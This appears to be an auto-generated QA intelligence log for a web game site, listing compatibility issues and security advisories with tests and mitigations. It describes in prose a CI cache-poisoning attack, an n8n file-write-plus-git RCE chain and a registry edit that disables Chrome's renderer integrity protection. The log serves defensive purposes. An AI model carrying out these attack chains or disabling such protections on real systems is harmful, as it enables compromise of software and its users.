Each tagged WebKit revision can introduce rendering quirks (canvas anti-aliasing differences, WebAudio sample-rate handling, CSS subgrid/layout drift, IndexedDB transaction timing) that are NOT present in the equivalent Chromium revision and that ship to all iOS/iPadOS/macOS Safari users via Apple's silent Rapid Security Response mechanism (per B-120). **Why this is the WEBKIT-SPECIFIC-RELEASE-TAG-RENDERING-DRIFT-CLASS dimension distinct from B-059 (Safari 27 beta 58 features — feature count) and B-090 (Safari 27 WWDC26 525 fixes — fix count)**: C-140 is the SPECIFIC-RELEASE-TAG-DRIFT dimension where a tagged WebKit revision diverges from the equivalent Chromium baseline in subtle rendering/audio/timing ways that are not captured by feature-count or fix-count metrics. **Distinct from C-126 (Interop 2025 cross-browser compatibility milestone — industry initiative)**: C-126 is the multi-vendor initiative; C-140 is the SPECIFIC WebKit tag that may or may not conform to it. **Why this matters for GameZipper**: (a) iOS Safari is ~25-30% of GameZipper's mobile traffic (per internal analytics), and ALL iOS browsers use WebKit (Apple mandate), so WebKit-7620+ will be the rendering engine for a large player slice once Safari 27 ships; (b) the drift is SUBTLE — a game that renders perfectly on Chromium may have anti-aliased text that looks different, audio that plays at a slightly different sample rate, or IndexedDB transactions that commit in a different order on WebKit-7620+; (c) Apple's silent RSR mechanism (B-120) means the WebKit version can change UNDER users mid-session without any user interaction or even a Settings notification. **Test**: (1) on a WebKit nightly build matching WebKit-7620.1.16.11.5 (or Safari 27 beta), load 10 sample GameZipper games; (2) compare rendering side-by-side with Chrome on the same device (screenshots + pixel-diff); (3) compare WebAudio output (record audio + spectral-diff); (4) compare IndexedDB transaction ordering (instrumented test); (5) document any drift as a regression to file against WebKit. **Mitigation**: add WebKit nightly to the cross-browser QA matrix; do not rely on Chromium-only testing for any iOS-targeted feature; subscribe to webkit.org/blog for release-note drift signals. Source: https://github.com/WebKit/WebKit/releases/tag/WebKit-7620.1.16.11.5 (Nov 13 2025 — WebKit-7620.1.16.11.5 release tag; rolling into Safari 27 stable baseline).

- [W-209] **[P3]** blog.csdn.net/weixin_39802884/article/details/119460308 (Aug 6 2021, recurring 2026) documents the Chrome/Edge "STATUS_INVALID_IMAGE_HASH" error and the widespread user-side workaround: a registry edit (`HKLM\SOFTWARE\Policies\Google\Chrome\RendererCodeIntegrityEnabled` DWORD = 0) that disables Chrome's Renderer Code Integrity protection (which blocks unsigned DLLs from loading into the renderer process). The workaround was popularized because Chrome 79+ re-enabled the protection and it conflicts with some antivirus/EDR/parental-control software that inject unsigned DLLs, causing Chrome to refuse to load any page. The REGRESSION: after applying the workaround, some Canvas/WebGL extensions become silently unavailable (the protection also gates certain GPU-driver paths), and users report "your game doesn't work" when the root cause is their own registry edit. **Why this is the USER-SELF-INFLICTED-RENDERER-INTEGRITY-DISABLE-WORKAROUND-CLASS dimension, a SIBLING of B-136 (iOS Safari experimental feature toggles — iOS-side user misconfiguration) but on the Windows/Chromium side**: W-209 is the Windows-side user-self-inflicted misconfiguration class — users break their own browser via a registry workaround, then report a game bug. **Distinct from S-085 (WebRTC UAF) / S-098 (Push Security browser attack TTPs)**: those are attacker-driven; W-209 is user-driven. **Distinct from W-203 (Check Point ~2000 attacks/week baseline)**: W-203 is attack frequency; W-209 is user workaround. **Why this matters for GameZipper**: (a) a non-trivial fraction of Windows Chrome/Edge users have applied this registry workaround (it is a top Google search result for "STATUS_INVALID_IMAGE_HASH"); (b) these users may find GameZipper WebGL games render incorrectly or fail to initialize certain extensions (e.g., `OES_texture_float`, `WEBGL_compressed_texture_s3tc`); (c) the failure is SILENT — the game loads but renders garbage or missing textures, with no error message; (d) QA cannot easily reproduce this without applying the registry edit on a test machine. **Test**: (1) on a Windows test machine, apply the registry workaround (`RendererCodeIntegrityEnabled=0`); (2) load 5 sample GameZipper WebGL games; (3) verify all expected WebGL extensions are available (`gl.getSupportedExtensions()`) and games render correctly; (4) if any extension is missing or rendering is broken, document it and add a user-facing diagnostic ("Your browser's renderer integrity protection is disabled, which may affect game rendering. Re-enable it in your browser settings or registry."); (5) RESTORE the registry key after testing. **Mitigation**: feature-detect critical WebGL extensions at game init; if missing, display a diagnostic hint that mentions renderer-integrity protection as a possible cause; never assume all extensions are available. Source: https://blog.csdn.net/weixin_39802884/article/details/119460308 (Aug 6 2021, recurring 2026 — "chrome/edge解决不能打开问题"; STATUS_INVALID_IMAGE_HASH; RendererCodeIntegrityEnabled registry workaround; recurring user-side misconfiguration).

- [PC-020] **[P2]** so.html5.qq.com/page/real/search_news?docid=70000021_5816a05700305852 (May 14 2026 — "REPO下载失败") and so.html5.qq.com/page/real/search_news?docid=70000021_25569e1d85033552 (April 17 2026 — UU加速器 cross-region LAN联机 baseline) document a 2026 user-complaint class where players blame the GAME for failures that are actually network/CDN/ISP-transit issues: "下载失败" (download failed), "无法发现联机主机" (cannot discover multiplayer host), "组队房间加载失败" (room loading failed), "连接超时" (connection timeout). The root causes are ISP-level DNS filtering, CDN edge unreachability, cross-region latency, or regional blocking — but the user-facing error is attributed to the game, generating complaints and 1-star reviews. **Why this is the NETWORK-BLAMED-GAME-BUG-DIAGNOSTIC-DISAMBIGUATION dimension distinct from G-156 (cross-region multiplayer reliability baseline — connection quality) and W-187 (ISP-level DNS/network filtering CDN reachability — infrastructure reach)**: PC-020 is the USER-COMPLAINT-ATTRIBUTION dimension — the player blames the game when the fault is the network, requiring GameZipper to distinguish game-bug from network-bug with clear error messages + retry affordance. **Distinct from G-156/W-187**: G-156 is the reliability baseline; W-187 is the infrastructure reach; PC-020 is the diagnostic-UX dimension that turns a network failure into either a retained player (clear message + retry) or a churned player (opaque "loading failed"). **Why this matters for GameZipper**: (a) GameZipper games load assets from the gamezipper.com origin (GitHub Pages + Cloudflare CDN); if a player's ISP blocks or throttles the CDN edge, the game fails to load and the player sees a generic "Something went wrong" toast (per the existing gz-error-toast pattern) — indistinguishable from a real game bug; (b) the 2026 data shows this is a TOP complaint category in the CN market (where ISP filtering is common); (c) the fix is NOT to fix the network (GameZipper cannot), but to make the error message DIAGNOSTIC — "Network connection failed. Check your internet or try a VPN" instead of "Something went wrong"; (d) a retry button with exponential backoff recovers many transient failures. **Test**: (1) simulate network failure (Chrome DevTools > Network > Offline, or throttle to "Slow 3G" + 100% packet loss) on 5 sample GameZipper games; (2) verify the error message is DIAGNOSTIC (mentions network/connection) not generic ("Something went wrong"); (3) verify a retry button is present and functional; (4) verify the game does not silently hang (spinner forever) — it should time out and show the diagnostic message within 10s; (5) verify localStorage-saved progress is NOT lost on network failure (the game should remain playable offline if assets are cached). **Mitigation**: differentiate network errors from game-logic errors in the error-boundary code; show "Network connection failed — check your internet or try again" for fetch/XHR failures vs "Game error — refresh the page" for JS exceptions; add a retry button with exponential backoff; cache game assets in a service worker for offline play. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_5816a05700305852 (May 14 2026 — "2026年解决REPO游戏下载失败:网络优化是关键"); https://so.html5.qq.com/page/real/search_news?docid=70000021_25569e1d85033552 (April 17 2026 — UU加速器 cross-region LAN联机 baseline).

- [A-046] **[P2]** so.html5.qq.com/page/real/search_news?docid=70000021_2746a2953f744152 (June 10 2026 — "2026长文本语音克隆不卡软件推荐:悄然声色 50万字 voice-clone benchmark, 98% timbre similarity sustained") establishes the new 2026 PLAYER EXPECTATION that audio does NOT drift, crackle, or pitch-shift over long sessions. The 悄然声色 benchmark — 500,000-character continuous voice synthesis with 98% timbre similarity maintained throughout — sets the bar for audio stability that players now unconsciously expect from ALL long-form audio experiences, including game BGM and SFX loops. **Why this is the LONG-SESSION-AUDIO-STABILITY-BASELINE-SHIFT dimension distinct from P-089 (WKWebView evaluateJavaScript completion-handler crash — native crash, not audio) and the BGM-cleanup pitfall (setInterval timer cleanup — memory leak)**: A-046 is the SUBJECTIVE-AUDIO-QUALITY-OVER-LONG-SESSIONS dimension — no crash, no leak, but the audio ITSELF degrades (pitch drift, crackling, level fluctuation, sample-rate drift) over a 30+ minute play session. **Distinct from P-089**: P-089 is a native crash; A-046 is subjective audio quality. **Distinct from the BGM-cleanup pitfall**: that is a memory/timer leak; A-046 is the audio signal itself degrading. **Why this matters for GameZipper**: (a) GameZipper games with BGM loops (per the BGM-cleanup pitfall in gamezipper-qa, many games use `setInterval` to drive oscillator frequency changes for melody) can accumulate FLOATING-POINT DRIFT in the oscillator frequency over long sessions, causing perceptible pitch drift; (b) Web Audio `AudioContext` sample-rate can drift if the audio device changes (Bluetooth headset connect/disconnect) mid-session; (c) gain-node level automation can accumulate rounding errors, causing perceptible volume fluctuation; (d) hearing-impaired players using hearing aids are MOST sensitive to audio drift (their aids amplify the drift); (e) the 2026 benchmark shifts player expectation — a 30-minute session with pitch-drifting BGM now feels "broken" where it previously felt acceptable. **Test**: (1) for each GameZipper game with BGM, play continuously for 30 minutes; (2) record the audio output (loopback capture) at minute 0, 10, 20, 30; (3) spectral-diff the recordings — verify no pitch drift (fundamental frequency stable within +/-0.1%), no crackling (no spectral artifacts above -60dBFS), no level fluctuation (RMS stable within +/-1dB); (4) disconnect/reconnect a Bluetooth headset mid-session and verify the AudioContext recovers without sample-rate drift; (5) test with a screen-reader/hearing-aid simulation to verify the audio remains intelligible for hearing-impaired players. **Mitigation**: drive oscillator frequency from absolute time (`audioContext.currentTime`) not from accumulated `setInterval` ticks; re-base the frequency calculation every 60s to prevent drift; handle `audioContext.onstatechange` to reset the sample rate on device change; use `AnalyserNode` to monitor output level and clamp to a stable range. Source: https://so.html5.qq.com/page/real/search_news?docid=70000021_2746a2953f744152 (June 10 2026 — "2026长文本语音克隆不卡软件推荐"; 悄然声色 500,000-character voice-clone benchmark; 98% timbre similarity sustained; establishes long-session audio-stability player expectation baseline).

---


- [S-196] **[P1]** blog.csdn.net/weixin_42376192/article/details/161181175 (May 18 2026) and cloud.tencent.com/developer/article/2679559 (June 26 2026 — JavaScript Weekly #20) document the TanStack "Mini Shai-Hulud" GitHub Actions cache-poisoning attack and its June 26 2026 dead-man's-switch variant. Timeline of the May 12 2026 primary attack: 14:37 a TanStack maintainer receives an innocent-looking PR titled "fix: 优化vite构建速度" modifying only `vite.config.mjs` with ~30 lines of plausible cache config; 14:41 GitHub Actions runs the PR via `pull_request_target` (which uses the SECRETS of the base branch); 14:43 the malicious code poisons the pnpm dependency cache and uploads it to GitHub's cache server; 14:45 the main-branch auto-release workflow pulls the poisoned cache; 14:47 the malicious code extracts the npm OIDC publish token from Runner process memory; 14:49 the attacker pushes 42 malicious packages / 84 versions in 6 minutes; 15:18 npm security takes them down — but every published package carried VALID SLSA Level-3 build provenance because it was minted by the legitimate GitHub Actions OIDC flow, bypassing ~95% of supply-chain security scanners that trust SLSA L3. The June 26 2026 variant (JS Weekly #20) adds a TOKEN-REVOCATION-AWARE DEAD-MAN'S-SWITCH: the malicious code watches for npm token revocation and, on detection, wipes the dropped files and IoCs to slow incident response. **Why this is the CI-CACHE-POISONING-WITH-VALID-SLSA-PROVENANCE-BYPASS dimension distinct from S-128 (ClawHub AI-agent-skill marketplace — vector is the marketplace store, not CI cache) and S-130 (TanStack/Mistral cross-registry npm+PyPI Shai-Hulud worm — propagation is autonomous worm, not a single PR-cache-poison)**: S-196 is the GITHUB-ACTIONS-CACHE-POISONING-WITH-VALID-PROVENANCE dimension where a SINGLE approved PR can weaponize the entire CI supply chain in 6 minutes WITH cryptographic provenance that defeats SLSA-L3-trusting scanners. **Distinct from S-105 (Miasma Phantom Gyp binding.gop bypass — different scanner-bypass surface: postinstall hook vs CI cache)**: S-105 bypasses postinstall scanners; S-196 bypasses BUILD-PROVENANCE scanners. **Why this matters for GameZipper**: (a) GameZipper's own game pipeline (`.game-pipeline-prompt.md`) and QA scripts pull npm dependencies; if the GameZipper repo or any of its build dependencies (Vite, esbuild, Tailwind, Phaser, etc.) is compromised via this CI-cache vector, malicious code ships to production game pages signed with GameZipper's legitimate provenance; (b) the attack is COMPLETE WITHIN 6 MINUTES — slower detection pipelines (4h cron, daily scan) MISS it entirely; (c) SLSA L3 trust is broken — existing sigstore/provenance verification tools are insufficient; (d) the dead-man's-switch variant means IoCs are wiped, lengthening incident-response time. **Test**: (1) audit GameZipper's `.github/workflows/` for `pull_request_target` triggers — every one is a potential entry point; (2) verify NO workflow uses `pull_request_target` with write access to caches, packages, or OIDC tokens; (3) pin all CI caches by hash, not by branch; (4) enable GitHub's "restrict actions to tagged versions" + "require approvals for PRs touching CI files"; (5) add a `actions/dependency-review-action` step that rejects new dependencies from unverified publishers even if SLSA L3 is present; (6) monitor npm download-count anomalies (per S-199) as a secondary signal. **Mitigation**: never use `pull_request_target` for builds — use `pull_request` (no secrets); use `actions/cache@v4` with `key: ${{ hashFiles('pnpm-lock.yaml') }}` and a separate `restore-keys` that cannot be poisoned by PRs; enable Sigstore bundle verification AND npm provenance-filter (filter by trusted publisher, not just SLSA level); subscribe to GitHub Security Advisories for Vite/Tailwind/Phaser. Source: https://blog.csdn.net/weixin_42376192/article/details/161181175 (May 18 2026 — "GitHub Actions缓存污染:从理论漏洞到TanStack供应链核弹级攻击全解析"; 6-minute 42-package 84-version attack; SLSA L3 bypass); https://cloud.tencent.com/developer/article/2679559 (June 26 2026 — JS Weekly #20; dead-man's-switch variant that deletes files on token revocation).

---

- [S-197] **[P2]** blog.csdn.net/qiqiqi233/article/details/159990612 (May 29 2026) documents CVE-2026-27498: an authenticated remote-code-execution vulnerability in n8n (the open-source workflow-automation platform) versions prior to 2.2.0 and 1.123.8. Any user with workflow-create or workflow-edit permission can chain a git operation with the `n8n-nodes-base.readWriteFile` ("Read/Write Files from Disk") node: the attacker writes a crafted config file (e.g., a malicious `.git/hooks/post-checkout` or a `~/.ssh/config`) to disk via the readWriteFile node, then triggers a git operation that executes the crafted file as a shell command on the n8n host. The chain achieves arbitrary shell-command execution without ever touching a traditional command-injection surface. **Why this is the WORKFLOW-AUTOMATION-PLATFORM-AUTH-CHAIN-RCE dimension distinct from S-132 (Langflow CVE-2026-33017 — different platform, single-node exec()) and S-160 (LangGraph RCE chain — different platform, AI-agent layer)**: S-197 is the GIT-OPERATION-AS-RCE-TRIGGER dimension specific to workflow platforms that ship both a file-write node AND a git node — the vulnerability is the COMPOSITION of two individually-safe nodes. **Distinct from S-133 (React2Shell RSC RCE — different stack)**: S-133 is framework-level; S-197 is platform-composition-level. **Why this matters for GameZipper**: (a) GameZipper's ops/bi/growth pipelines may adopt n8n, Langflow, Dify, or similar workflow-automation platforms for cron-driven QA reporting, SEO monitoring, or content generation; (b) the attack requires only low-privilege workflow-create permission (often granted to junior ops/devops team members), not admin; (c) the composition pattern (file-write + git) is INVISIBLE to node-level security scanners that audit each node independently; (d) any GameZipper internal n8n instance exposed on a VPN or zero-trust network is at risk if a team member's credentials are phished. **Test**: (1) inventory GameZipper internal tooling for n8n/Langflow/Dify/Activepieces usage; (2) for each instance, verify version is >= 2.2.0 (n8n) or the patched equivalent; (3) verify the `readWriteFile` node is disabled via `NODES_EXCLUDE=n8n-nodes-base.readWriteFile` env var; (4) verify workflow-create permission is restricted to fully-trusted admins only; (5) run a red-team exercise: with a low-privilege workflow-create account, attempt the file-write + git chain and verify it is blocked; (6) audit git nodes for any path that can be reached from a user-writable file. **Mitigation**: upgrade n8n to >= 2.2.0 / 1.123.8; set `NODES_EXCLUDE` to disable `readWriteFile` if not needed; restrict workflow-create permission; segregate the n8n host from production game servers via network policy; alert on any workflow that uses BOTH a file-write node and a git node. Source: https://blog.csdn.net/qiqiqi233/article/details/159990612 (May 29 2026 — "[网络安全]CVE-2026-27498漏洞复现"; n8n readWriteFile + git chain RCE; patched in 2.2.0 / 1.123.8).

---

- [S-198] **[P1]** blog.csdn.net/weixin_42376192/article/details/161069264 (May 14 2026) documents CVE-2026-20131: an insecure-deserialization (CWE-502) remote-code-execution vulnerability in Cisco Secure Firewall Management Center (FMC) software, disclosed March 4 2026 with CVSS 3.1 score 10.0 — the FIRST PERFECT-SCORE (10.0) vulnerability of 2026. CISA added it to the Known Exploited Vulnerabilities (KEV) catalog on March 19 2026 with a federal-agency patch deadline of April 2 2026. CISA's advisory explicitly states the vulnerability is being actively exploited by ransomware groups with an attack success rate approaching 100%. The vulnerability requires no authentication and no user interaction; an unauthenticated network attacker sends a crafted serialized Java object to the FMC management interface and achieves full system compromise (C:H/I:H/A:H). **Why this is the NETWORK-PERIMETER-CVSS-10-DESERIALIZATION-RCE-2026-FIRST-PERFECT-SCORE dimension distinct from S-167 (CVE-2026-20127 Cisco Catalyst SD-WAN CVSS 10.0 — different Cisco product line, SD-WAN not FMC, and 2023-origin not 2026-first-perfect-score) and S-166 (CVE-2026-45185 Exim SMTP remote memory corruption — different protocol layer)**: S-198 is the DESERIALIZATION attack-class dimension AND the 2026 ANNUAL-FIRST-PERFECT-SCORE milestone — the first vulnerability in 2026 to hit CVSS 10.0, marking the start of a likely escalating CVSS-10 cadence for the year. **Distinct from S-167**: S-167 is SD-WAN; S-198 is the firewall-management-plane (FMC). **Why this matters for GameZipper**: (a) although GameZipper itself does not run Cisco FMC, the FMC product line protects many of the enterprise networks, CDNs, and transit providers that GameZipper traffic flows through; a CVSS-10 ransomware-exploited vulnerability in FMC means COMPROMISED TRANSIT NETWORKS can MITM or redirect gamezipper.com traffic; (b) the "first perfect score of 2026" milestone signals the annual CVE severity baseline — expect more CVSS-10 vulnerabilities through the year; (c) the ~100% ransomware exploitation success rate means any unpatched FMC in the transit path is a likely-compromised node; (d) GameZipper's hosting/CDN vendor security questionnaires should explicitly ask about FMC patch status. **Test**: (1) cannot test directly (GameZipper does not run Cisco FMC) — treat as a THIRD-PARTY/TRANSIT risk; (2) ask Cloudflare, GitHub, and any other transit/CDN vendor to confirm FMC patch status (or confirm they do not use Cisco FMC); (3) verify gamezipper.com is HTTPS-only with HSTS preload so a compromised transit node cannot MITM without certificate-bypass malware; (4) verify Subresource Integrity (SRI) hashes on all third-party script tags (`<script src="..." integrity="sha384-...">`) so a CDN-tampered script is rejected by the browser; (5) monitor for certificate-transparency-log anomalies on gamezipper.com (mis-issued certs would indicate a compromised CA or transit MITM). **Mitigation**: enable HSTS preload; add SRI to all third-party scripts; subscribe to CISA KEV and review weekly; ask CDN/transit vendors for FMC patch attestation; assume-breach posture for transit networks (encrypt everything end-to-end). Source: https://blog.csdn.net/weixin_42376192/article/details/161069264 (May 14 2026 — "2026年首个满分漏洞CVE-2026-20131:Cisco FMC反序列化RCE"; CVSS 10.0; CISA KEV March 19 2026; ransomware ~100% success rate).

---

- [S-199] **[P2]** blog.indegy.com (Tenable research by Ron Popov, May 27-28 2026) documents the "Download pumping" npm deception technique: attackers use coordinated bot networks to artificially inflate the download counts of malicious npm packages, manipulating the trust-scoring algorithms used by Socket, Dependabot, Snyk, and npm's own reputation system. A package with 10,000+ weekly downloads is auto-classified as "popular" and granted reduced scrutiny — bypassing reputation-based supply-chain defenses without ever needing to compromise a maintainer account or forge SLSA provenance (cf. S-196). The pumped packages then ride automated dependency-update PRs (Dependabot, Renovate) into victim repositories. **Why this is the NPM-DOWNLOAD-COUNT-INFLATION-TRUST-SCORING-MANIPULATION dimension distinct from S-126 (eslint-config-prettier maintainer-phishing — different vector: account takeover, not download-count manipulation) and S-157 (GhostClaw/@openclaw-ai typosquat — different vector: name confusion, not reputation gaming)**: S-199 is the REPUTATION-METRIC-MANIPULATION layer where the attacker does NOT touch the package code, the maintainer account, OR the build pipeline — they only inflate the METRIC that reputation systems use to decide whether to scrutinize. **Distinct from S-105 (Miasma binding.gop bypass — scanner bypass via build hook)**: S-105 bypasses a technical scanner control; S-199 bypasses a STATISTICAL trust-scoring control. **Why this matters for GameZipper**: (a) the GameZipper build pipeline (Vite, Tailwind, Phaser, monetag-manager dependencies) auto-accepts dependency updates via Dependabot/Renovate PRs that are approved based on npm reputation scores; (b) a download-pumped malicious package that reaches the "popular" threshold auto-merges into the GameZipper dependency tree without human review; (c) the attack is INVISIBLE to traditional scanners because the package code may be clean for weeks before the attacker flips a runtime trigger (time-bomb); (d) GameZipper's ad/analytics dependencies (Monetag, AdSense SDKs) are especially attractive targets because they are auto-updated. **Test**: (1) for each npm dependency in GameZipper's `package.json`, check the npm download-count history (npm-stat.com) for sudden unexplained spikes (a hallmark of download pumping); (2) verify the package's GitHub repo activity matches its download count (a package with 50K weekly downloads and 0 GitHub commits in 6 months is suspicious); (3) enable Socket's "download-count anomaly" alert if available; (4) require HUMAN review for any dependency-update PR that introduces a package <6 months old, regardless of download count; (5) pin critical dependencies (Phaser, Vite, Tailwind) to specific versions and review major-version bumps manually. **Mitigation**: do not auto-merge Dependabot/Renovate PRs for dependencies <12 months old; verify download-count history before trusting a package's reputation; prefer packages with active GitHub maintenance; subscribe to Socket security advisories; use `npm audit signatures` and require packages to be signed by a trusted publisher (not just downloaded often). Source: https://blog.indegy.com (May 27-28 2026 — Tenable Exposure Management Blog; Ron Popov research; "Download pumping: New npm deception technique for supply chain attacks").

---

- [W-210] **[P3]** new.qq.com/rain/a/20251204A057ZS00 (Dec 4 2025) and cloud.tencent.com/developer/article/2672214 (June 2026 — JavaScript Weekly #16) document two converging shifts in the JavaScript runtime ecosystem: (1) Anthropic completed its first public acquisition on Dec 3 2025, buying the Bun JavaScript-runtime team and project (Bun: a drop-in Node.js replacement with bundler/transpiler/package-manager built in, ~7M monthly downloads); (2) Bun shipped built-in headless-browser automation and cron scheduling primitives in-core during 2026 H1, positioning itself as a single-binary QA/automation runtime distinct from Node+Puppeteer or Deno. Combined, these shifts mean a major JavaScript runtime is now AI-VENDOR-OWNED (Anthropic) AND bundles browser-automation primitives in-core. **Why this is the AI-VENDOR-ACQUIRED-JS-RUNTIME-CONSOLIDATION-WITH-BROWSER-AUTOMATION dimension distinct from W-159 (Rolldown 1.0 + Vite 8 — different tool, build-toolchain migration) and C-101 (multi-registry CI/CD scanner — different layer, supply-chain scanning)**: W-210 is the JS-RUNTIME-VENDOR-CONSOLIDATION dimension where the runtime itself changes hands to an AI vendor AND acquires browser-automation primitives — affecting both supply-chain risk (Anthropic now controls a runtime used by GameZipper QA tooling) and rendering-output parity (Bun ships JavaScriptCore, not V8/Blink, so Bun-driven browser automation may produce different rendering than Chromium-based Playwright/Puppeteer). **Distinct from C-092 (Codex CLI + Playwright MCP — different tool, AI-CLI not runtime)**: C-092 is an AI-CLI tool on top of an existing runtime; W-210 is the runtime ITSELF being AI-acquired. **Why this matters for GameZipper**: (a) any future GameZipper QA test runner that adopts Bun inherits Anthropic-supply-chain risk (a repeat of the npm-vendor-trust questions raised by S-196 TanStack); (b) Bun-driven browser automation uses JavaScriptCore under the hood, which may render Canvas/WebGL/WebAudio DIFFERENTLY from the Chromium-based Playwright that GameZipper currently uses (per the post-deploy-verification Phase 4 Kachilu/browser_navigate flow) — switching QA runtime from Node+Chromium to Bun+JavaScriptCore can produce false positives/negatives; (c) the cron-scheduling primitive in Bun core may tempt GameZipper cron jobs (like this very test-intelligence cron) to migrate off Hermes to Bun — but Bun's cron is single-process and lacks Hermes's delegation/skill system; (d) Anthropic's ownership means Bun's roadmap now serves Anthropic's commercial priorities, not the open-source community's. **Test**: (1) audit GameZipper QA tooling for Bun usage (`which bun`; `grep -r 'bun' package.json`); (2) if Bun is used, verify the version is pinned and the SHA-256 matches the official release; (3) run a side-by-side Canvas/WebGL rendering test on 3 sample games: Playwright (Chromium) vs Bun-driven automation (JavaScriptCore) — pixel-diff the output; (4) verify no GameZipper cron job has silently migrated to Bun's built-in cron; (5) document Bun as a supply-chain risk in the GameZipper vendor-risk register. **Mitigation**: do NOT adopt Bun for production QA rendering tests (prefer Chromium-based Playwright for parity with real player browsers); if Bun is used for non-rendering tasks (bundling, test running), pin the version and verify SHA-256; track Anthropic's Bun roadmap for security-relevant changes; prefer Node.js LTS for any QA tool that drives a browser. Source: https://new.qq.com/rain/a/20251204A057ZS00 (Dec 4 2025 — "Anthropic 完成首笔公开收购,买下 JavaScript 运行时团队 Bun"); https://cloud.tencent.com/developer/article/2672214 (June 2026 — JS Weekly #16; Bun built-in headless-browser automation + cron scheduling).

---

- [C-141] **[P3]** gamedev.land (May 13 2026 — "Adaptive Layout for a Poki HTML5 game" workshop) formalizes the Poki-platform ADAPTIVE-LAYOUT QA gate as a third-party-distributor reference baseline. The workshop documents the specific layout-adaptivity requirements that Poki (and, by extension, CrazyGames, Y8, and similar HTML5-game distributors) impose on submitted games: the game canvas must reflow correctly across (a) portrait and landscape orientation, (b) viewport widths from 320px (small phone) to 2560px (4K monitor), (c) aspect ratios from 9:16 (folded foldable) to 21:9 (ultrawide), and (d) devicePixelRatio from 1 (desktop) to 3-4 (retina mobile). Games that fail any of these checks are rejected at submission. **Why this is the THIRD-PARTY-DISTRIBUTOR-ADAPTIVE-LAYOUT-QA-BASELINE dimension distinct from C-075 (Poki automated playtesting as submission gate — different layer: submission workflow, not layout) and C-106 (Poki automated playtesting as release gate — different layer: release workflow, not layout)**: C-141 is the LAYOUT-ADAPTIVITY-REQUIREMENT dimension — the SPECIFIC technical gate (orientation/viewport/aspect-ratio/dpr) that a game must pass, independent of the submission/release workflow. **Distinct from C-073 (foldable viewport resize mid-game — different scope: foldable-specific)**: C-073 is foldable-only; C-141 covers ALL viewport variations Poki requires. **Distinct from G-160 (WebGL canvas auto-resize class bug — different layer: bug class, not submission gate)**: G-160 is a bug pattern; C-141 is a SUBMISSION GATE that catches it. **Why this matters for GameZipper**: (a) GameZipper's own games may eventually be submitted to Poki/CrazyGames for additional distribution; (b) even without submitting, the Poki adaptive-layout baseline is the de-facto industry standard — players expect the same adaptivity whether the game is on gamezipper.com or Poki; (c) the workshop provides CONCRETE testable thresholds (320px-2560px width, 9:16-21:9 aspect, 1-4 dpr) that GameZipper QA can adopt as a regression matrix; (d) games that pass the Poki gate are more likely to pass Apple/Google app-store review if GameZipper ever ships native wrappers. **Test**: (1) for each GameZipper game, run the Poki adaptive-layout matrix: 320/375/414/768/1024/1440/1920/2560px viewport widths × portrait/landscape × 1/2/3 devicePixelRatio; (2) verify the game canvas reflows without clipping, letterboxing, or distortion at each combination; (3) verify orientation change (portrait↔landscape) does not reset game state or cause a flash of unstyled content; (4) verify the game's UI elements (HUD, buttons, menus) remain tappable (≥48×48px touch target per WCAG 2.5.5) at the smallest viewport (320px); (5) document any failures as P1 layout bugs. **Mitigation**: use CSS `aspect-ratio` + `clamp()` for responsive canvas sizing; listen to `resize` AND `orientationchange` events; use `window.matchMedia('(orientation: portrait)')` for orientation-specific layout; test on real devices (BrowserStack or a device lab) at the extremes of the matrix; adopt the Poki workshop's test harness as a GameZipper CI gate. Source: https://www.gamedev.land/ (May 13 2026 — "Adaptive Layout for a Poki HTML5 game" workshop; Poki-platform adaptive-layout QA gate baseline).

---

- [P-092] **[P3]** sohu.com/a/1015491436_121503203 (April 28 2026 — "2026 年游戏应用洞察报告") establishes USER-RETENTION as the dominant mobile-game industry winning strategy for 2026, with concrete baseline metrics: 2025 mobile contributed 55% of total game-industry revenue, the global mobile-player base is ~3 billion, and total player-hours reached 444.6 billion. The report's central thesis is that user retention (D1/D7/D30) has overtaken user-acquisition (UA) as the highest-ROI lever for mobile-game success, because UA costs rose ~12% YoY in 2026 (per G-145) while retention improvements compound. **Why this is the INDUSTRY-RETENTION-FIRST-METRIC-BASELINE-2026 dimension distinct from G-143 (2026 mobile-game retention benchmarks D1 38%/D7 15%/D30 declining — the NUMBERS) and G-145 (hyper-casual 48h-lapse threshold + 12% YoY UA cost — the ECONOMICS)**: P-092 is the INDUSTRY-STRATEGIC-BASELINE dimension — the report-level thesis that retention is now THE winning strategy, requiring GameZipper to (a) benchmark its own retention against the 2026 industry baseline (not 2024-era numbers) and (b) shift product/QA investment from UA-funnel optimization to retention-funnel optimization (session length, return-rate, drop-off-point analysis). **Distinct from G-143**: G-143 is the metric numbers; P-092 is the STRATEGIC PRIORITY shift. **Distinct from G-145**: G-145 is the hyper-casual lapse economics; P-092 is the industry-wide strategic baseline. **Why this matters for GameZipper**: (a) GameZipper's existing retention analytics (per the BI dashboard /openapi.json `/api/games` endpoint) likely benchmarks against 2024-era D1/D7/D30 numbers that are now stale — the 2026 baseline is different; (b) the report's 55% mobile-revenue share confirms mobile is the majority player surface, reinforcing the post-deploy-verification Phase 4 mobile-QA priority; (c) the 444.6B player-hours total means the average mobile player plays ~148 hours/year (~25 minutes/day) — GameZipper session-length QA should target this average, not the 5-minute hyper-casual assumption; (d) retention-first strategy means QA should prioritize bugs that cause SESSION-ENDING crashes (P0) over bugs that cause cosmetic issues (P3), because a session-ending crash directly tanks D1 retention. **Test**: (1) pull GameZipper's actual D1/D7/D30 retention from the BI dashboard for the last 30 days; (2) compare against the 2026 industry baseline (D1 38%, D7 15% per G-143); (3) if GameZipper's D1 is below 38%, prioritize session-ending-crash bugs (P0) in the QA queue; (4) verify the average session length is ~25 minutes (per the 444.6B-hours/3B-players calculation); (5) verify the game library includes long-session genres (puzzle, strategy, simulation) that support the 25-minute average, not only hyper-casual 5-minute games. **Mitigation**: add retention-benchmark regression to the BI weekly report; prioritize P0 session-ending bugs over P3 cosmetic bugs; track session-length distribution per game and flag games with median session <5 minutes for redesign; A/B test retention-improving features (daily streaks, save-resume, level-select) on under-performing games. Source: https://www.sohu.com/a/1015491436_121503203 (April 28 2026 — "2026 年游戏应用洞察报告"; retention as core winning strategy; 2025 mobile = 55% revenue; ~3B players; 444.6B player-hours).

---

